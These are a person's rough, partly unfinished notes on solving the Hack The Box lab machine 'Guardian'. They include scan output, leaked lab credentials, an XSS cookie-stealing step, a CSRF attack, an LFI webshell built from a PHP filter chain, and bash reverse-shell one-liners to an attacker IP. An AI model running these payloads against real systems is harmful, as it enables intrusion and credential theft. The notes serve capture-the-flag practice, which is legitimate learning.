---
os:
status:
tags:
  - apachectl
  - reverse_engineer
  - csrf
aliases:
---
# Information Gathering

Scanned top TCP ports:

```sh
tcp + http
```

Enumerated open TCP ports:

```sh

```

---

# Enumeration

## Port 80 - HTTP (Apache)
We have subdomains, so we will enumerate each one of them.

### guardian.htb
```pages
[11:29:55] 301 -  309B  - /js  ->  http://guardian.htb/js/
[11:29:57] 403 -  277B  - /.ht_wsr.txt
[11:29:57] 403 -  277B  - /.htaccess.bak1
[11:29:57] 403 -  277B  - /.htaccess.save
[11:29:57] 403 -  277B  - /.htaccess.orig
[11:29:57] 403 -  277B  - /.htaccess.sample
[11:29:57] 403 -  277B  - /.htaccess_extra
[11:29:57] 403 -  277B  - /.htaccessBAK
[11:29:57] 403 -  277B  - /.htaccess_orig
[11:29:57] 403 -  277B  - /.htaccessOLD
[11:29:57] 403 -  277B  - /.htaccessOLD2
[11:29:57] 403 -  277B  - /.htaccess_sc
[11:29:57] 403 -  277B  - /.htm
[11:29:57] 403 -  277B  - /.html
[11:29:58] 403 -  277B  - /.htpasswds
[11:29:58] 403 -  277B  - /.httr-oauth
[11:29:58] 403 -  277B  - /.htpasswd_test
[11:29:59] 403 -  277B  - /.php
[11:30:14] 403 -  277B  - /cgi-bin/
[11:30:16] 301 -  310B  - /css  ->  http://guardian.htb/css/
[11:30:22] 301 -  313B  - /images  ->  http://guardian.htb/images/
[11:30:22] 403 -  277B  - /images/
[11:30:23] 404 -   16B  - /index.php/login/
[11:30:25] 301 -  317B  - /javascript  ->  http://guardian.htb/javascript/
[11:30:25] 403 -  277B  - /js/
[11:30:33] 403 -  277B  - /php5.fcgi
[11:30:38] 403 -  277B  - /server-status/
[11:30:39] 403 -  277B  - /server-status

```

The default password for every account is: `GU1234`


```users


mainDomain
Boone Basden: GU0142023@guardian.htb   GU1234
Jamesy Currin: GU6262023@guardian.htb
Stephenie Vernau: GU0702025@guardian.htb

```

### portal.guardian.htb
```pages

[11:29:48] 403 -  284B  - /.env   
[11:29:49] 403 -  284B  - /.gitkeep 11:29:49 [0/111]
[11:29:49] 403 -  284B  - /.gitk                                                                 
[11:29:49] 403 -  284B  - /.gitignore_global                                                     
[11:29:49] 403 -  284B  - /.gitlab                                                               
[11:29:49] 403 -  284B  - /.gitlab-ci.yml                                                        
[11:29:49] 403 -  284B  - /.gitlab/issue_templates
[11:29:49] 403 -  284B  - /.gitlab-ci/.env                                                       
[11:29:49] 403 -  284B  - /.gitlab-ci.off.yml                                                    
[11:29:49] 403 -  284B  - /.gitlab/merge_request_templates                       
[11:29:49] 403 -  284B  - /.gitlab/route-map.yml 
[11:29:49] 403 -  284B  - /.gitreview            
[11:29:49] 403 -  284B  - /.gitmodules           
[11:29:49] 403 -  284B  - /.ht_wsr.txt           
[11:29:49] 403 -  284B  - /.htaccess.orig                                
[11:29:49] 403 -  284B  - /.htaccess.sample      
[11:29:49] 403 -  284B  - /.htaccess.bak1                                                        
[11:29:49] 403 -  284B  - /.htaccess.save                                                        
[11:29:49] 403 -  284B  - /.htaccess_extra                                                       
[11:29:49] 403 -  284B  - /.htaccessOLD                                                          
[11:29:49] 403 -  284B  - /.htaccess_orig                                                        
[11:29:49] 403 -  284B  - /.htaccessBAK                   
[11:29:49] 403 -  284B  - /.htaccess_sc                         
[11:29:49] 403 -  284B  - /.htaccessOLD2                          
[11:29:49] 403 -  284B  - /.htm                                                                  
[11:29:49] 403 -  284B  - /.html                 
[11:29:49] 403 -  284B  - /.htpasswd_test        
[11:29:49] 403 -  284B  - /.httr-oauth                          
[11:29:49] 403 -  284B  - /.htpasswds            
[11:29:50] 403 -  284B  - /.php                  
[11:29:56] 301 -  326B  - /admin  ->  http://portal.guardian.htb/admin/
[11:30:06] 403 -  284B  - /cgi-bin/              
[11:30:07] 403 -  284B  - /composer.json         
[11:30:07] 403 -  284B  - /composer.lock         
[11:30:07] 301 -  327B  - /config  ->  http://portal.guardian.htb/config/
[11:30:07] 403 -  284B  - /config/               
[11:30:15] 301 -  329B  - /includes  ->  http://portal.guardian.htb/includes/
[11:30:15] 403 -  284B  - /includes/             
[11:30:16] 301 -  331B  - /javascript  ->  http://portal.guardian.htb/javascript/
[11:30:18] 200 -    1KB - /login.php             
[11:30:23] 403 -  284B  - /php5.fcgi             
[11:30:29] 403 -  284B  - /server-status/        
[11:30:29] 403 -  284B  - /server-status         
[11:30:33] 301 -  327B  - /static  ->  http://portal.guardian.htb/static/
[11:30:37] 403 -  284B  - /vendor/               
[11:30:37] 200 -    0B  - /vendor/autoload.php   
[11:30:37] 200 -    1KB - /vendor/composer/LICENSE
[11:30:37] 200 -    0B  - /vendor/composer/autoload_psr4.php
[11:30:37] 200 -    0B  - /vendor/composer/autoload_real.php
[11:30:37] 200 -    0B  - /vendor/composer/autoload_static.php
[11:30:37] 200 -    0B  - /vendor/composer/ClassLoader.php
[11:30:37] 200 -    0B  - /vendor/composer/autoload_classmap.php
[11:30:37] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[11:30:37] 200 -   25KB - /vendor/composer/installed.json

```

```users

GU0142023
GU6262023
GU0762023
GU9612024
mireielle.feek
sammy.treat      --> can't access the material, he will get link from myra.galsworthy
myra.galsworthy
mark.pargetter*
valentijn.temby$
crin.hambidge
mireielle.feek
vivi.smallthwaite*
admin$
jamil.enockson :DHsNnk3V503
```

```pages(parameter)
/student/submission.php($assignment_id, $submission_title, $_FILE) x3 CVE
	1. 


/lecturer/grade-submission.php --> json '{"submission_id":123, "mark_given":50}' --> can change the marks of any submission.

```

```kill switches

$submission['mark_given'] --> xss
$submission_id            --> xss
$student_email            --> xss
$graded_at                --> xss

```
### gitea.guardian.htb

- there is file in `/config` called 
- The passwords are $password = hash('sha256', $password . $salt);

```users
[jamil.enockson@guardian.htb](mailto:jamil.enockson@guardian.htb)
[mark.pargetter@guardian.htb](mailto:mark.pargetter@guardian.htb)
admin [admin@guardian.htb](mailto:admin@guardian.htb)
```

```php
config/config.php
<?php
return [
'db' => [
'dsn' => 'mysql:host=localhost;dbname=guardiandb',
'username' => 'root',
'password' => 'Gu4rd14n_un1_1s_th3_b3st',
'options' => []
],
'salt' => '8Sb)tM1vs1SS'
];
```


After i while i found the i can exploit the xlsx vulnerablitiy by putting the xss payload in the sheet name.
The xss script while execute in the page of the user so i can fetch his cookie and send it back to me.

```sh
╭─slom at slom-Legion-5-Pro-16IAH7H in ~/HTB/linux/hard/Guardian
╰─○ sudo python3 -m http.server 80                                          
[sudo] password for slom: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.84 - - [06/Sep/2025 17:46:25] code 404, message File not found
10.10.11.84 - - [06/Sep/2025 17:46:25] "GET /cookies?c=PHPSESSID=qsu07m3km5occ3hcoousb1kgk2 HTTP/1.1" 404 -

```

Now, we have lecturer cookie, After browsing the website i found `notices` page that i submit a link and the admin will visit the link, 
And there is interesting admin page called add user which i can add users from it as admins. But how can i get the csrf and cookie of admin?

After looking at the source code i found:
```
$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
header('Location: /login.php');
exit();
}
$config = require '../config/config.php';
$salt = $config['salt'];
$userModel = new User($pdo);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

$csrf_token = $_POST['csrf_token'] ?? '';
if (!is_valid_token($csrf_token)) {
die("Invalid CSRF token!");
}


--------------

function get_token_pool()
{
global $global_tokens_file;
return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : [];
}
function add_token_to_pool($token)
{
global $global_tokens_file;
$tokens = get_token_pool();
$tokens[] = $token;
file_put_contents($global_tokens_file, json_encode($tokens));
}
function is_valid_token($token)
{
$tokens = get_token_pool();
return in_array($token, $tokens);
}
```
which the backend fitch any user csrf (admin, lecturer) in the same file. so if we got lecturer csrf we can use it to do csrf attack succesfully.


After createing the admin user.
we found LFI in another `reports.php` file
```
$report = $_GET['report'] ?? 'reports/academic.php';
if (strpos($report, '..') !== false) {
	die("<h2>Malicious request blocked 🚫 </h2>");
}

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
	die("<h2>Access denied. Invalid file 🚫</h2>");
}

include($report);
```
This means we mustn't have `..` in our file include, and it should end up with one of those `enrollment.php`, `academic.php`, `financial.php`, `system.php`.

I found new tool called `php_filter_chain_generator.py` which can make reverse shell in `include()` function. so we can make the reverse shell then append one of the files so we can break the validations


Lets create one that make us see the phpinfor page.
```sh
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
```

[[Z Assets/Images/Pasted image 20250906184020.jpeg|Open: Pasted image 20250906184020.png]]
![[Z Assets/Images/Pasted image 20250906184020.jpeg]]



### Generate a filter chain

Use a generator (public “php filter chain generator” scripts exist) to encode a tiny webshell:

```bash
python3 php_filter_chain_generator.py --chain '<?php eval($_POST["a"]);?>' | tee loot/php_filter_chain.txt
```

This yields something like:

```
php://filter/convert.iconv.utf-8.utf-16le|convert.base64-decode|.../resource=....
```

### Trigger include with comma trick

Visit (replace `<CHAIN>` with the generator output):

```
http://portal.guardian.htb/admin/reports.php?report=<CHAIN>,system.php
```

### Pop a reverse shell

```bash
# listener on attacker
rlwrap -q 0 nc -lvnp 4444

# trigger from attacker
curl -X POST 'http://portal.guardian.htb/admin/reports.php?report=<CHAIN>,system.php' -d 'a=system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"");'
```

Catch a shell as **www-data**.

## My  shell that works
```
python3 php_filter_chain_generator.py --chain "<?php system(\"bash -c 'bash -i >& /dev/tcp/10.10.16.94/4444 0>&1'\"); ?>"
```
then catch it.

look at the db
```
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000 --> admin
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56 --> jamil.enockson

```

### doing ssh and we are in!!


---

then running `sudo -l` found i can run script as anothter user which is `mark` and that file we can write on it, so we made in it reverse shell. And we are mark now!

---

then we run `sudo -l` found we can run another custom executable file. try to decompile it and found it runs `apachectl`.

# apachectl
You can execute command using this utility by doing
```
apachectl -f LodModule evil_module evil.so
```
So, You can run any binary code by specifing the `LoadModule` flag.

In our custom binary, it was checking on the path of the binary "trivial. we can just put it where they want, the main idea is to execute whatever we want", used `changeBinBash.c`.

---

# Exploitation

## SQL Injection


---

# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---

# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---

# Trophy

{{image}}

>[!todo] **User.txt**
>flag

>[!todo] **Root.txt**
>flag

**/etc/shadow**

```sh

```

# Resolution summary

>[!summary]
>- Step 1
>- Step 2
